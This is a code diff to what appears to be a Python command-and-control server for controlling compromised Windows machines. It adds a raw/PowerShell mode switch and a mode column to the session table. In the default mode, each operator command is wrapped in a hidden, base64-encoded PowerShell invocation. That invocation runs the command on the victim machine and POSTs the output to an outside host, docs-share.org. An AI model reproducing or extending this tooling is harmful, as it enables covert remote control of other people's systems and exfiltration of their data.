@@ -45,6 +45,7 @@ class Session:
         self.last_checkin = time.time()
         self.task_queue = []
         self.cmd_queue = []
+        self.mode = 'ps'
 
     def checkin(self):
         self.last_checkin = time.time()
@@ -244,10 +245,11 @@ def command_input_thread():
                 table.add_column("ID", style="sky_blue2", justify="center")
                 table.add_column("IP Address", style="plum3")
                 table.add_column("Last Checkin", style="green3")
-                
-                for s_id, s in SESSIONS.items():
+                table.add_column("Mode", style="grey74", justify="center")
+
+                for s in SESSIONS.values():
                     last_seen = time.time() - s.last_checkin
-                    table.add_row(str(s.id), s.ip, f"{last_seen:.1f}s ago")
+                    table.add_row(str(s.id), s.ip, f"{last_seen:.1f}s ago", s.mode)
                 console.print(table)
                 continue
 
@@ -269,6 +271,22 @@ def command_input_thread():
             elif base_cmd == 'back':
                 CURRENT_SESSION_ID = None
                 PROMPT = "[medium_purple1]mouse > [/]"
+                continue
+
+            elif base_cmd == 'mode':
+                if CURRENT_SESSION_ID is None:
+                    console.print("[-] No session selected.", style="red")
+                    continue
+                session = SESSIONS[CURRENT_SESSION_ID]
+                if len(parts) > 1:
+                    new_mode = parts[1].lower()
+                    if new_mode in ('raw', 'ps'):
+                        session.mode = new_mode
+                        console.print(f"[+] Mode set to: {new_mode}", style="sky_blue2")
+                    else:
+                        console.print("[-] Invalid mode. Use 'raw' or 'ps'", style="red")
+                else:
+                    console.print(f"[*] Current mode: {session.mode}", style="grey74")
                 continue
 
             if CURRENT_SESSION_ID is None:
@@ -306,12 +324,15 @@ def command_input_thread():
                     console.print("[-] Usage: download <remote_path>", style="red")
 
             else:
-                raw_ps = f'[System.Net.ServicePointManager]::Expect100Continue = $false; $o=({cmd} *>&1 | Out-String); if ([string]::IsNullOrEmpty($o)) {{ $o = " " }}; $b=[System.Text.Encoding]::UTF8.GetBytes($o); iwr https://docs-share.org///results -UseBasicParsing -Method POST -Body $b'
-                
-                encoded_cmd = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
-                ps_cmd = f'powershell -nop -w hidden -enc {encoded_cmd}'
-                session.cmd_queue.append(ps_cmd)
-                console.print(f"[+] Queued command: {cmd}", style="sky_blue2")
+                if session.mode == 'raw':
+                    session.cmd_queue.append(cmd)
+                    console.print(f"[+] Queued: {cmd}", style="sky_blue2")
+                else:
+                    raw_ps = f'[System.Net.ServicePointManager]::Expect100Continue = $false; $o=({cmd} *>&1 | Out-String); if ([string]::IsNullOrEmpty($o)) {{ $o = " " }}; $b=[System.Text.Encoding]::UTF8.GetBytes($o); iwr https://docs-share.org///results -UseBasicParsing -Method POST -Body $b'
+                    encoded_cmd = base64.b64encode(raw_ps.encode('utf-16le')).decode('utf-8')
+                    ps_cmd = f'powershell -nop -w hidden -enc {encoded_cmd}'
+                    session.cmd_queue.append(ps_cmd)
+                    console.print(f"[+] Queued: {cmd}", style="sky_blue2")
 
         except EOFError:
             break
@@ -357,6 +378,4 @@ def run():
         httpd.server_close()
 
 if __name__ == '__main__':
-    if len(sys.argv) > 1:
-        TASK_QUEUE.append(sys.argv[1])
     run()
